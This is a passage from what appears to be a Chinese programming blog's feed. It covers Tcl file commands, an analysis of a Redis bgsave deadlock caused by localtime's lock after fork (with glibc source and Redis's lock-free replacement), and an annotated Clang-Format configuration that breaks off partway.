以”r”方式打开文件”hello.txt”。返回供其他命令(gets,close等)使用的文件标识。</p><p>文件的打开方式和我们熟悉的C语言类似，有以下方式：</p><table><thead><tr><th align="center">方式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">r</td><td align="left">只读方式打开。文件必须已经存在。这是默认方式。</td></tr><tr><td align="center">r+</td><td align="left">读写方式打开，文件必须已经存在。</td></tr><tr><td align="center">w</td><td align="left">只写方式打开文件，如果文件存在则清空文件内容，否则创建一新的空文件。</td></tr><tr><td align="center">w+</td><td align="left">读写方式打开文件，如文件存在则清空文件内容，否则创建新的空文件。</td></tr><tr><td align="center">a</td><td align="left">只写方式打开文件，文件必须存在，并把指针指向文件尾。</td></tr><tr><td align="center">a+</td><td align="left">读写方式打开文件，并把指针指向文件尾。如文件不存在，创建新的空文件。</td></tr></tbody></table><p>open命令返回一个字符串用于表识打开的文件。当调用别的命令（如：gets,puts,close）对打开的文件进行操作时，就可以使用这个文件标识符。</p><h3 id="6-4、puts命令"><a href="#6-4、puts命令" class="headerlink" title="6.4、puts命令"></a>6.4、puts命令</h3><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">puts $f &quot;Hello, world!&quot;<br></code></pre></td></tr></table></figure><p>puts命令把”Hello, world!”字符串写到 <code>$f</code> 中，如果命令中不输入 <code>$f</code> 则输出到控制台。</p><h3 id="6-5、close命令"><a href="#6-5、close命令" class="headerlink" title="6.5、close命令"></a>6.5、close命令</h3><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">close $f<br></code></pre></td></tr></table></figure><p>关闭标识为 <code>$f</code> 的文件，命令返回值为一空字符串。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> TCL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>localtime函数死锁分析</title>
      <link href="/2019/01/12/localtime/"/>
      <url>/2019/01/12/localtime/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>前段时间，线上的redis实例出现了一些异常的情况，具体变现就是bgsave子进程hang住了，从而引发了后续的很多问题，通过排查最终发现是<code>localtime</code>相关函数引起的，这里做一下总结记录。</p><p>C 库函数 *<em>struct tm *localtime(const time_t <em>timer)</em></em> 作用是根据本地时区信息将 <strong>time</strong> 函数获取的 <strong>UTC</strong> 时间调整为为本地时间，并将具体的时间信息填充到tm结构体之中；</p><h1 id="二、详细介绍"><a href="#二、详细介绍" class="headerlink" title="二、详细介绍"></a>二、详细介绍</h1><p>由于localtime函数的具体底层实现的缘由，在某些场景下会触发localtime函数导致的死锁问题，这里详细的分析原因以及后续的处理方案；</p><h2 id="2-1-底层实现分析"><a href="#2-1-底层实现分析" class="headerlink" title="2.1 底层实现分析"></a>2.1 底层实现分析</h2><p><code>localtime</code>函数底层的调用栈信息为：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">localtime()   =&gt;   __tz_convert()<br></code></pre></td></tr></table></figure><ul><li><code>localtime</code> 函数的底层代码实现（代码位于<code>./time/localtime.c</code>）：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Return the `struct tm&#x27; representation of *T in local time.  */</span><br><span class="hljs-keyword">struct</span> tm *<br><span class="hljs-title function_">localtime</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">time_t</span> *t)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> __tz_convert (t, <span class="hljs-number">1</span>, &amp;_tmbuf);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>__tz_convert</code> 函数的底层代码实现（代码位于<code>./time/tzset.c</code>）：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Return the `struct tm&#x27; representation of *TIMER in the local timezone.</span><br><span class="hljs-comment">   Use local time if USE_LOCALTIME is nonzero, UTC otherwise.  */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *</span><br><span class="hljs-class">__<span class="hljs-title">tz_convert</span> (<span class="hljs-title">const</span> <span class="hljs-title">time_t</span> *<span class="hljs-title">timer</span>, <span class="hljs-title">int</span> <span class="hljs-title">use_localtime</span>, <span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">tp</span>)</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">long</span> <span class="hljs-type">int</span> leap_correction;<br>  <span class="hljs-type">int</span> leap_extra_secs;<br><br>  <span class="hljs-keyword">if</span> (timer == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      __set_errno (EINVAL);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  __libc_lock_lock (tzset_lock);<br><br>  <span class="hljs-comment">/* Update internal database according to current TZ setting.</span><br><span class="hljs-comment">     POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname.</span><br><span class="hljs-comment">     This is a good idea since this allows at least a bit more parallelism.  */</span><br>  tzset_internal (tp == &amp;_tmbuf &amp;&amp; use_localtime);<br><br>  <span class="hljs-keyword">if</span> (__use_tzfile)<br>    __tzfile_compute (*timer, use_localtime, &amp;leap_correction,<br>      &amp;leap_extra_secs, tp);<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (! __offtime (timer, <span class="hljs-number">0</span>, tp))<br>tp = <span class="hljs-literal">NULL</span>;<br>      <span class="hljs-keyword">else</span><br>__tz_compute (*timer, tp, use_localtime);<br>      leap_correction = <span class="hljs-number">0L</span>;<br>      leap_extra_secs = <span class="hljs-number">0</span>;<br>    &#125;<br><br>  __libc_lock_unlock (tzset_lock);<br><br>  <span class="hljs-keyword">if</span> (tp)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (! use_localtime)<br>&#123;<br>  tp-&gt;tm_isdst = <span class="hljs-number">0</span>;<br>  tp-&gt;tm_zone = <span class="hljs-string">&quot;GMT&quot;</span>;<br>  tp-&gt;tm_gmtoff = <span class="hljs-number">0L</span>;<br>&#125;<br><br>      <span class="hljs-keyword">if</span> (__offtime (timer, tp-&gt;tm_gmtoff - leap_correction, tp))<br>        tp-&gt;tm_sec += leap_extra_secs;<br>      <span class="hljs-keyword">else</span><br>tp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> tp;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解释分析：</strong></p><p><code>__tz_convert</code> 使用的是一个<code>static</code>变量的<code>tzset_lock</code>全局锁；</p><ul><li>线程安全？：由于使用直接返回的是一个全局变量，这里并不是线程安全的；</li><li>信号安全？：<code>localtime</code>与<code>localtime_r</code>这两个函数都不是信号安全的，如果在信号处理函数中使用，就要考虑到死锁的情况，比如，程序调用<code>localtime_r</code>，加锁后信号发生，信号处理函数中也调用<code>localtime_r</code>的话，会因为获取不到锁所以一直阻塞；</li></ul><p><strong>对于线上资源出现异常的分析</strong></p><p>对于redis类资源，本身存在一个主线程以及一些bio线程，对于bio线程来说，输出日志是很常见的事情，但是存在这么一种场景，当父进程中其中一个bio线程正在输出日志，此时fork了一个子进程开始执行bgsave，由于子进程会继承父进程的锁，所以对于子进程来说，当它尝试输出有一些日志的信息，就会由于已经拥有一个锁而导致出现死锁的情况，进而导致子进程会出现hang住的情况。</p><h2 id="2-2-解决方案"><a href="#2-2-解决方案" class="headerlink" title="2.2 解决方案"></a>2.2 解决方案</h2><p>使用全局变量的方式<code>timezone</code>以及<code>daylight</code>的相关信息，避免调用<code>localtime</code>函数；</p><p>方案参考（redis的官方解决方案）：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">is_leap_year</span><span class="hljs-params">(<span class="hljs-type">time_t</span> year)</span> &#123;<br>    <span class="hljs-keyword">if</span> (year % <span class="hljs-number">4</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;         <span class="hljs-comment">/* A year not divisible by 4 is not leap. */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (year % <span class="hljs-number">100</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">/* If div by 4 and not 100 is surely leap. */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (year % <span class="hljs-number">400</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">/* If div by 100 *and* 400 is not leap. */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;                  <span class="hljs-comment">/* If div by 100 and not by 400 is leap. */</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">nolocks_localtime</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tm *tmp, <span class="hljs-type">time_t</span> t, <span class="hljs-type">time_t</span> tz, <span class="hljs-type">int</span> dst)</span> &#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">time_t</span> secs_min = <span class="hljs-number">60</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">time_t</span> secs_hour = <span class="hljs-number">3600</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">time_t</span> secs_day = <span class="hljs-number">3600</span>*<span class="hljs-number">24</span>;<br><br>    t -= tz;                            <span class="hljs-comment">/* Adjust for timezone. */</span><br>    t += <span class="hljs-number">3600</span>*dst;                      <span class="hljs-comment">/* Adjust for daylight time. */</span><br>    <span class="hljs-type">time_t</span> days = t / secs_day;         <span class="hljs-comment">/* Days passed since epoch. */</span><br>    <span class="hljs-type">time_t</span> seconds = t % secs_day;      <span class="hljs-comment">/* Remaining seconds. */</span><br><br>    tmp-&gt;tm_isdst = dst;<br>    tmp-&gt;tm_hour = seconds / secs_hour;<br>    tmp-&gt;tm_min = (seconds % secs_hour) / secs_min;<br>    tmp-&gt;tm_sec = (seconds % secs_hour) % secs_min;<br><br>    <span class="hljs-comment">/* 1/1/1970 was a Thursday, that is, day 4 from the POV of the tm structure</span><br><span class="hljs-comment">     * where sunday = 0, so to calculate the day of the week we have to add 4</span><br><span class="hljs-comment">     * and take the modulo by 7. */</span><br>    tmp-&gt;tm_wday = (days+<span class="hljs-number">4</span>)%<span class="hljs-number">7</span>;<br><br>    <span class="hljs-comment">/* Calculate the current year. */</span><br>    tmp-&gt;tm_year = <span class="hljs-number">1970</span>;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">/* Leap years have one day more. */</span><br>        <span class="hljs-type">time_t</span> days_this_year = <span class="hljs-number">365</span> + is_leap_year(tmp-&gt;tm_year);<br>        <span class="hljs-keyword">if</span> (days_this_year &gt; days) <span class="hljs-keyword">break</span>;<br>        days -= days_this_year;<br>        tmp-&gt;tm_year++;<br>    &#125;<br>    tmp-&gt;tm_yday = days;  <span class="hljs-comment">/* Number of day of the current year. */</span><br>    <span class="hljs-comment">/* We need to calculate in which month and day of the month we are. To do</span><br><span class="hljs-comment">     * so we need to skip days according to how many days there are in each</span><br><span class="hljs-comment">     * month, and adjust for the leap year that has one more day in February. */</span><br>    <span class="hljs-type">int</span> mdays[<span class="hljs-number">12</span>] = &#123;<span class="hljs-number">31</span>, <span class="hljs-number">28</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>&#125;;<br>    mdays[<span class="hljs-number">1</span>] += is_leap_year(tmp-&gt;tm_year);<br><br>    tmp-&gt;tm_mon = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(days &gt;= mdays[tmp-&gt;tm_mon]) &#123;<br>        days -= mdays[tmp-&gt;tm_mon];<br>        tmp-&gt;tm_mon++;<br>    &#125;<br><br>    tmp-&gt;tm_mday = days+<span class="hljs-number">1</span>;  <span class="hljs-comment">/* Add 1 since our &#x27;days&#x27; is zero-based. */</span><br>    tmp-&gt;tm_year -= <span class="hljs-number">1900</span>;   <span class="hljs-comment">/* Surprisingly tm_year is year-1900. */</span><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> LOCALTIME_TEST_MAIN</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-comment">/* Obtain timezone and daylight info. */</span><br>    tzset(); <span class="hljs-comment">/* Now &#x27;timezome&#x27; global is populated. */</span><br>    <span class="hljs-type">time_t</span> t = time(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">aux</span> =</span> localtime(&amp;t);<br>    <span class="hljs-type">int</span> daylight_active = aux-&gt;tm_isdst;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> <span class="hljs-title">tm</span>;</span><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];<br><br>    nolocks_localtime(&amp;tm,t,timezone,daylight_active);<br>    strftime(buf,<span class="hljs-keyword">sizeof</span>(buf),<span class="hljs-string">&quot;%d %b %H:%M:%S&quot;</span>,&amp;tm);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[timezone: %d, dl: %d] %s\n&quot;</span>, (<span class="hljs-type">int</span>)timezone, (<span class="hljs-type">int</span>)daylight_active, buf);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h1 id="三、相关函数解析"><a href="#三、相关函数解析" class="headerlink" title="三、相关函数解析"></a>三、相关函数解析</h1><h2 id="3-1-time"><a href="#3-1-time" class="headerlink" title="3.1 time()"></a>3.1 time()</h2><p><code>time</code>函数会返回从公元 1970 年1 月1 日的<code>UTC 时间</code>从0 时0 分0 秒算起到现在所经过的秒数。如果 t 并非空指针的话，此函数也会将返回值存到t 指针所指的内存；</p><p><strong>函数声明：</strong><code>time_t time(time_t *t)</code></p><p>**返回值：**成功则返回秒数，失败则返回((time_t)-1)值，错误原因存于errno 中；</p><h2 id="3-2-gettimeofday"><a href="#3-2-gettimeofday" class="headerlink" title="3.2 gettimeofday()"></a>3.2 gettimeofday()</h2><p><code>gettimeofday()</code> 函数会将目前的时间存储在 tv 所指的结构中，将当地时区的信息则放到 tz 所指的结构中并返回；</p><p><strong>函数声明：</strong><code>int gettimeofday (struct timeval * tv, struct timezone * tz)</code></p><p><strong>结构体定义：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> &#123;</span><br>    <span class="hljs-type">long</span> tv_sec;  <span class="hljs-comment">//秒</span><br>    <span class="hljs-type">long</span> tv_usec;  <span class="hljs-comment">//微秒</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timezone</span> &#123;</span><br>    <span class="hljs-type">int</span> tz_minuteswest;  <span class="hljs-comment">//和Greenwich 时间差了多少分钟</span><br>    <span class="hljs-type">int</span> tz_dsttime;  <span class="hljs-comment">//日光节约时间的状态</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>tz_dsttime</code>所代表的状态信息为：</p><ul><li>DST_NONE  &#x2F;&#x2F;不使用</li><li>DST_USA  &#x2F;&#x2F;美国</li><li>DST_AUST  &#x2F;&#x2F;澳洲</li><li>DST_WET  &#x2F;&#x2F;西欧</li><li>DST_MET  &#x2F;&#x2F;中欧</li><li>DST_EET  &#x2F;&#x2F;东欧</li><li>DST_CAN  &#x2F;&#x2F;加拿大</li><li>DST_GB  &#x2F;&#x2F;大不列颠</li><li>DST_RUM  &#x2F;&#x2F;罗马尼亚</li><li>DST_TUR  &#x2F;&#x2F;土耳其</li><li>DST_AUSTALT  &#x2F;&#x2F;澳洲(1986 年以后)</li></ul><p>**返回值：**成功则返回0，失败返回－1，错误代码存于errno；</p><h2 id="3-3-setlocale"><a href="#3-3-setlocale" class="headerlink" title="3.3 setlocale()"></a>3.3 setlocale()</h2><p>C 库函数 -  *<em>char *setlocale(int category, const char <em>locale)</em></em> 设置或读取地域化信息；</p><p><strong>函数声明：</strong><code>char *setlocale(int category, const char *locale)</code></p><ul><li>category – 这是一个已命名的常量，指定了受区域设置影响的函数类别；<ul><li>LC_ALL 包括下面的所有选项；</li><li>LC_COLLATE 字符串比较。参见 strcoll()；</li><li>LC_CTYPE 字符分类和转换。例如 strtoupper()；</li><li>LC_MONETARY 货币格式，针对 localeconv()；</li><li>LC_NUMERIC 小数点分隔符，针对 localeconv()；</li><li>LC_TIME 日期和时间格式，针对 strftime()；</li><li>LC_MESSAGES 系统响应；</li></ul></li><li>locale – 如果 locale 是 NULL 或空字符串 “”，则区域名称将根据环境变量值来设置，其名称与上述的类别名称相同；</li></ul><p>**返回值：**如果成功调用 setlocale()，则返回一个对应于区域设置的不透明的字符串。如果请求无效，则返回值是 NULL</p><h2 id="3-4-tzset"><a href="#3-4-tzset" class="headerlink" title="3.4 tzset()"></a>3.4 tzset()</h2><p>C 库函数 -  *<em>char *setlocale(int category, const char <em>locale)</em></em> 设置或读取地域化信息，<code>tzset</code>函数在实现的时候是通过内部的<code>tzset_internal</code>函数来完成的；</p><p><strong>调用方式：</strong></p><ul><li>显式调用：直接执行<code>tzset</code>函数。显式调用内部的<code>tzset_internal</code>函数，强制<code>tzset</code>不管何种情况一律重新加载<code>TZ</code>信息或者<code>/etc/localtime</code>信息；</li><li>隐式调用：执行<code>localtime</code>的时候会隐式调用<code>tzset</code>函数。隐式调用内部的<code>tzset_internal</code>函数，只有在<code>TZ</code>发生变化，或者加载文件名发生变化的时候才会再次加载时区信息【如果只是<code>/etc/localtime</code>的内容发生了变化，而文件名<code>/etc/localtime</code>没有变化，则不会再次加载时区信息，导致<code>localtime</code>函数调用仍然以老时区转换UTC时间到本地时间】；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 锁 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clang-Format格式化工具</title>
      <link href="/2019/01/08/clang-format/"/>
      <url>/2019/01/08/clang-format/</url>
      
        <content type="html"><![CDATA[<p><code>Clang-Format</code> 是基于 clang 的一个命令行工具，这个工具能够自动化格式 C&#x2F;C++&#x2F;Obj-C 代码，支持多种代码风格（Google, Chromium, LLVM, Mozilla, WebKit），同时也支持自定义风格（通过编写<code>.clang-format</code>文件），这里记录了常用的配置 Clang-Format 常用的配置项及其含义。</p><h1 id="一、安装方式"><a href="#一、安装方式" class="headerlink" title="一、安装方式"></a>一、安装方式</h1><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># mac</span><br>brew install clang-format<br></code></pre></td></tr></table></figure><h1 id="二、参数解析"><a href="#二、参数解析" class="headerlink" title="二、参数解析"></a>二、参数解析</h1><p>官方文档的参数解析为：<a href="http://clang.llvm.org/docs/ClangFormatStyleOptions.html">http://clang.llvm.org/docs/ClangFormatStyleOptions.html</a></p><h2 id="2-1-参数解析"><a href="#2-1-参数解析" class="headerlink" title="2.1 参数解析"></a>2.1 参数解析</h2><p>BasedOnStyle样式信息：</p><ul><li><code>LLVM</code>：一种遵循<a href="https://link.jianshu.com/?t=http://llvm.org/docs/CodingStandards.html">LLVM coding standards</a>的样式；</li><li><code>Google</code>：一种遵循<a href="https://link.jianshu.com/?t=http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml">Google’s C++ style guide</a>的样式；</li><li><code>Chromium</code>：一种遵循<a href="https://link.jianshu.com/?t=http://www.chromium.org/developers/coding-style">Chromium’s style guide</a>的样式；</li><li><code>Mozilla</code>：一种遵循<a href="https://link.jianshu.com/?t=https://developer.mozilla.org/en-US/docs/Developer_Guide/Coding_Style">Mozilla’s style guide</a>的样式；</li><li><code>WebKit</code>：一种遵循<a href="https://link.jianshu.com/?t=http://www.webkit.org/coding/coding-style.html">WebKit’s style guide</a>的样式；</li></ul><h2 id="2-2-详细参数信息"><a href="#2-2-详细参数信息" class="headerlink" title="2.2 详细参数信息"></a>2.2 详细参数信息</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">---<br><span class="hljs-comment"># 语言:</span><br><span class="hljs-comment"># - None: </span><br><span class="hljs-comment"># - Cpp: </span><br><span class="hljs-comment"># - Java: </span><br><span class="hljs-comment"># - JavaScript: </span><br><span class="hljs-comment"># - ObjC: </span><br><span class="hljs-comment"># - Proto: </span><br><span class="hljs-comment"># - TableGen: </span><br><span class="hljs-comment"># - TextProto: </span><br>Language: Cpp<br><br><span class="hljs-comment"># 基于的编码规范, 可选:</span><br><span class="hljs-comment"># - LLVM: https://llvm.org/docs/CodingStandards.html</span><br><span class="hljs-comment"># - Google: https://google.github.io/styleguide/cppguide.html</span><br><span class="hljs-comment"># - Chromium: https://chromium.googlesource.com/chromium/src/+/refs/heads/main/styleguide/styleguide.md</span><br><span class="hljs-comment"># - Mozilla: https://firefox-source-docs.mozilla.org/code-quality/coding-style/index.html</span><br><span class="hljs-comment"># - WebKit: https://www.webkit.org/coding/coding-style.html</span><br><span class="hljs-comment"># - Microsoft: https://docs.microsoft.com/en-us/visualstudio/ide/editorconfig-code-style-settings-reference</span><br><span class="hljs-comment"># - GNU: https://www.gnu.org/prep/standards/standards.html</span><br><span class="hljs-comment"># - InheritParentConfig: 继承父目录的编码规范, 如果有的话, 不是一个真正的编码规范</span><br><span class="hljs-comment"># - None: 不使用, 即自动配置, 也就是本文件中的自定义内容</span><br>BasedOnStyle: Google<br><br><span class="hljs-comment"># 访问声明符缩进</span><br>AccessModifierOffset: -4<br><br><span class="hljs-comment"># 开括号后的参数(函数的参数)对齐(包括小括号/大括号/尖括号), 建议使用 Align</span><br><span class="hljs-comment"># - Align: 对于开括号, 即在换行情况下, 换行的参数跟开括号对齐, 建议使用</span><br><span class="hljs-comment"># - DontAlign: 不对于开括号, 即换行时使用配置的空格数</span><br><span class="hljs-comment"># - AlwaysBreak: 永远换行, 即第一个参数都不允许粘连括号, 会强制换行, 换行后使用配置空格数对齐</span><br><span class="hljs-comment"># - BlockIndent: 同 AlwaysBreak, 多了一个操作: 如果参数不固定在同一行, 闭括号将在下一行</span><br>AlignAfterOpenBracket: Align<br><br><span class="hljs-comment"># 结构休数组统一初始化对齐, 建议不配置, 没过多必要, 详见 clang-format doc</span><br><span class="hljs-comment"># - None: 不做处理, 即保留开发者的代码</span><br><span class="hljs-comment"># - Left: 左对齐</span><br><span class="hljs-comment"># - Right: 右对齐</span><br>AlignArrayOfStructures: None<br><br><span class="hljs-comment"># 连续赋值语句的对齐，即多个赋值语句连续出现时的对齐策略配置, 包含多个子配置项</span><br>AlignConsecutiveAssignments:<br>  <span class="hljs-comment"># 是否启用, 建议 false</span><br>  Enabled: <span class="hljs-literal">false</span><br>  <span class="hljs-comment"># 是否跨过空行, 即多个对齐语句中间有空行时, 是否跨过, 如果要开启连续赋值语句的配置, 建议 false</span><br>  AcrossEmptyLines: <span class="hljs-literal">false</span><br>  <span class="hljs-comment"># 是否跨过注释, 建议 false</span><br>  AcrossComments: <span class="hljs-literal">false</span><br>  <span class="hljs-comment"># 是否跨过复合语句(包括空行及注释), 建议 false</span><br>  AlignCompound: <span class="hljs-literal">false</span><br>  <span class="hljs-comment"># 是否(右)对齐赋值操作的操作符, 建议 true</span><br>  PadOperators: <span class="hljs-literal">true</span><br><br><span class="hljs-comment"># 同 AlignConsecutiveAssignments , 表示连续位定义语句出现时, 是否需要对齐:符号, 位变量定义用得少, 可以不开启</span><br>AlignConsecutiveBitFields:<br>  <span class="hljs-comment"># 是否启用, 建议 false</span><br>  Enabled: <span class="hljs-literal">false</span><br>  <span class="hljs-comment"># 是否跨过空行, 即多个对齐语句中间有空行时, 是否跨过, 如果要开启连续赋值语句的配置, 建议 false</span><br>  AcrossEmptyLines: <span class="hljs-literal">false</span><br>  <span class="hljs-comment"># 是否跨过注释, 建议 false</span><br>  AcrossComments: <span class="hljs-literal">false</span><br>  <span class="hljs-comment"># 是否跨过复合语句(包括空行及注释), 建议 false</span><br>  AlignCompound: <span class="hljs-literal">false</span><br>  <span class="hljs-comment"># 是否(右)对齐赋值操作的操作符, 建议 true</span><br>  PadOperators: <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># 是否对齐连续声明</span><br>AlignConsecutiveDeclarations:<br>  Enabled: <span class="hljs-literal">false</span><br>  AcrossEmptyLines: <span class="hljs-literal">false</span><br>  AcrossComments: <span class="hljs-literal">false</span><br>  AlignCompound: <span class="hljs-literal">false</span><br>  PadOperators: <span class="hljs-literal">false</span><br>AlignConsecutiveMacros:<br>  Enabled: <span class="hljs-literal">false</span><br>  AcrossEmptyLines: <span class="hljs-literal">false</span><br>  AcrossComments: <span class="hljs-literal">false</span><br>  <span class="hljs-comment"># 只在 AlignConsecutiveAssignments 配置中有效, 自动生成的 clang-format 有此项, 忽略</span><br>  AlignCompound: <span class="hljs-literal">false</span><br>  <span class="hljs-comment"># 只在 AlignConsecutiveAssignments 配置中有效, 自动生成的 clang-format 有此项, 忽略</span><br>  PadOperators: <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># 续行符(\\)对齐:</span><br><span class="hljs-comment"># - DontAlign: 不做操作</span><br><span class="hljs-comment"># - Left: 尽可能向左对齐, 即最长一行代码为准</span><br><span class="hljs-comment"># - Right: 跟开发都写的最远的\\对齐(即不会自动缩减你的空格), 建议使用这个</span><br>AlignEscapedNewlines: Right<br><br><span class="hljs-comment"># 在二元/一元表达式中的操作数对齐, 可选值:</span><br><span class="hljs-comment"># - DontAlign: 不做对齐, 在操作数换行后, 将使用 ContinuationIndentWidth 来对齐</span><br><span class="hljs-comment"># - Align: 即换行时, 操作数( or 操作符加操作数)跟上一行的第一个操作数左对齐, 具体操作符要不要换行,</span><br><span class="hljs-comment">#          由 BreakBeforeBinaryOperators 配置决定</span><br>AlignOperands: Align<br><br>AlignTrailingComments: <span class="hljs-literal">true</span><br>AllowAllArgumentsOnNextLine: <span class="hljs-literal">true</span><br>AllowAllParametersOfDeclarationOnNextLine: <span class="hljs-literal">true</span><br>AllowShortEnumsOnASingleLine: <span class="hljs-literal">true</span><br>AllowShortBlocksOnASingleLine: Never<br>AllowShortCaseLabelsOnASingleLine: <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># 允许短的函数放在同一行</span><br><span class="hljs-comment"># - None: </span><br><span class="hljs-comment"># - InlineOnly: 定义在类中</span><br><span class="hljs-comment"># - Empty: 空函数</span><br><span class="hljs-comment"># - Inline: 定义在类中，空函数</span><br><span class="hljs-comment"># - All: </span><br>AllowShortFunctionsOnASingleLine: All<br><br><span class="hljs-comment"># 允许 lambda 在一行中, 同上, 建议 All</span><br>AllowShortLambdasOnASingleLine: All<br><br><span class="hljs-comment"># 是否将简单的 if(else/else if) 语句中的 body 跟 if(else/else if) 放置于同一行，可选值</span><br><span class="hljs-comment"># - Never: 永远不, 建议值</span><br><span class="hljs-comment"># - WithoutElse: 没有 else/else if 时, 允许</span><br><span class="hljs-comment"># - OnlyFirstIf: 只有第一个 if 允许</span><br><span class="hljs-comment"># - AllIfAndElse: 所有的 if/else 都允许</span><br>AllowShortIfStatementsOnASingleLine: Never<br><br><span class="hljs-comment"># 是否允许 loop 语句体跟 loop 语句共行, true/false , 建议 false</span><br>AllowShortLoopsOnASingleLine: <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># Deprecated, 废弃定义, 设置为 None 即可</span><br>AlwaysBreakAfterDefinitionReturnType: None<br><br><span class="hljs-comment"># Return 类型后是否换行, 诡异的定义, 请设置为 None 即可</span><br>AlwaysBreakAfterReturnType: None<br><br><span class="hljs-comment"># 多常量字符串定义是, 是否在第一个字符串常量前换行, true/false , 建议 false</span><br>AlwaysBreakBeforeMultilineStrings: <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># 模板声明换行风格, 可选值:</span><br><span class="hljs-comment"># - No: 永远不对开发者的风格作处理</span><br><span class="hljs-comment"># - MultiLine: 建议值, 即仅在开发者写的模板声明(包括函数)跨越多行时, 进行换行, 否则维持原样</span><br><span class="hljs-comment"># - Yes: 不管如何都进行分行, 不建议</span><br>AlwaysBreakTemplateDeclarations: MultiLine<br><span class="hljs-comment"># 属性宏列表, 自定义, 用于语言扩展或静态分析注解, 可忽略</span><br>AttributeMacros:<br>  - __capability<br><span class="hljs-comment"># 函数调用时的参数(Arguments)是否放置于一行, false不放置, true强制一个调用参数一行, 建议false</span><br>BinPackArguments: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 函数定义参数(Parameters)是否放置于一行, 同BinPackArguments</span><br>BinPackParameters: <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># 大括号换行</span><br>BraceWrapping:<br>  <span class="hljs-comment"># 在case后的大括号是否换行</span><br>  AfterCaseLabel: <span class="hljs-literal">true</span><br>  <span class="hljs-comment"># class后</span><br>  AfterClass: <span class="hljs-literal">true</span><br>  <span class="hljs-comment"># 控制语句(if/for/while/switch/...)后是否换行</span><br>  <span class="hljs-comment"># - Never: 永远不, 即永远将语句体的大括号放置于控制语句同一行</span><br>  <span class="hljs-comment"># - 